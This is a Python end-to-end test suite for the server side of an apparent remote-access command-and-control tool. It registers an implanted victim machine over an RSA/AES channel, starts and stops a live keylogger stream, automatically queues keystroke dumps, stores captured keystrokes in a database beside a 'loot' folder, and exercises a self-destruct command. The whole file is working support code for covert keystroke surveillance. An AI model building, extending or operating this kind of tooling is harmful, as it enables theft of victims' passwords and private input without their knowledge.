"""End-to-end tests for the live keystroke stream lifecycle."""
import base64
import json
import os
import tempfile
import time

os.environ.setdefault("OPERATOR_TOKEN", "test-operator-token-123456")

import server
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes

_tmp = tempfile.mkdtemp(prefix="aerocommand_kls_test_")
server.DB_FILE = os.path.join(_tmp, "test.db")
server.LOOT_DIR = os.path.join(_tmp, "loot")
server.init_db()

c = server.app.test_client()
aes_key = get_random_bytes(32)
CID = "9.8.7.6:111"
TOKEN = "test-operator-token-123456"


def enc_payload(obj) -> str:
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(cipher.nonce + tag + ct).decode()


def send_result(command, output):
    r = c.post(f"/result?id={CID}",
               data=enc_payload({"command": command, "output": output, "client_id": CID}),
               content_type="application/octet-stream")
    assert r.status_code == 200


# Register client
r = c.get("/rsa_pub")
pub = RSA.import_key(r.data.decode())
rsa_cipher = PKCS1_OAEP.new(pub, hashAlgo=SHA256)
enc_key = base64.b64encode(rsa_cipher.encrypt(aes_key)).decode()
reg = {"client_id": CID, "host": "KEYBOX", "ip": "9.8.7.6", "pid": 111,
       "os": "Windows 11", "user": "tester", "admin": False}
r = c.post("/register", json={"encrypted_session_key": enc_key, "payload": enc_payload(reg)})
assert r.status_code == 200

# 1. keystart activates the stream for this client
import threading
monitor = threading.Thread(target=server.keylog_stream_monitor, daemon=True)
monitor.start()

send_result("keystart", "[+] Keylogger started — 'keydump' retrieves captured keystrokes")
assert server._keylog_stream["active"] and server._keylog_stream["client_id"] == CID
print("[+] keystart activates stream")

# 2. Monitor queues keydump within ~KLS_DUMP_INTERVAL ticks
deadline = time.time() + server.KLS_DUMP_INTERVAL * 3
while time.time() < deadline:
    with server.cmd_lock:
        if server.pending_commands.get(CID):
            break
    time.sleep(0.2)
with server.cmd_lock:
    queued = server.pending_commands.get(CID, [])
assert queued and queued[-1] == "keydump", f"no auto-keydump queued: {queued}"
with server._kls_lock:
    assert server._keylog_stream["waiting"], "waiting flag not set after queueing"
print("[+] monitor auto-queues keydump")

# 3. Real dump → persisted + broadcast, console suppressed; waiting clears
send_result("keydump", "[KEYLOG DUMP — 5 chars, buffer cleared]\nhello")
with server._kls_lock:
    assert not server._keylog_stream["waiting"]
import sqlite3
with sqlite3.connect(server.DB_FILE) as conn:
    row = conn.execute(
        "SELECT output FROM command_logs WHERE client_id=? AND command='keydump' ORDER BY id DESC LIMIT 1",
        (CID,)).fetchone()
assert row and "hello" in row[0], row
print("[+] real dump persisted, waiting cleared")

# 4. Idle tick (nothing typed) → fully skipped: no DB row, no results entry
before = len(server.results)
send_result("keydump", "[*] No keystrokes captured yet (keylogger running)")
with sqlite3.connect(server.DB_FILE) as conn:
    n_idle = conn.execute(
        "SELECT COUNT(*) FROM command_logs WHERE client_id=? AND output LIKE '%No keystrokes%'", (CID,)).fetchone()[0]
assert n_idle == 0, "idle tick leaked into DB"
assert len(server.results) == before, "idle tick leaked into results"
print("[+] idle tick suppressed entirely")

# 5. Manual keydump while stream active still persists (operator-initiated)
#    (auto flag only set when the STREAM is waiting on this client; simulate a
#     second operator command by clearing active state first)
server._keylog_stream.update(active=False)
send_result("keydump", "[KEYLOG DUMP — 2 chars, buffer cleared]\nok")
with sqlite3.connect(server.DB_FILE) as conn:
    row = conn.execute(
        "SELECT COUNT(*) FROM command_logs WHERE client_id=? AND command='keydump' AND output LIKE '%ok%'",
        (CID,)).fetchone()[0]
assert row >= 1
print("[+] manual keydump unaffected")

# 6. keystop deactivates
server._keylog_stream.update(active=True, client_id=CID, waiting=False)
send_result("keystop", "[+] Keylogger stopped — 'keydump' still retrieves the captured buffer")
assert not server._keylog_stream["active"] and server._keylog_stream["client_id"] is None
print("[+] keystop deactivates stream")

# 7. kill also deactivates
server._keylog_stream.update(active=True, client_id=CID, waiting=False)
send_result("kill", "[+] Self-destruct sequence initiated")
assert not server._keylog_stream["active"]
print("[+] kill deactivates stream")

print("ALL KEYSTREAM TESTS PASSED")
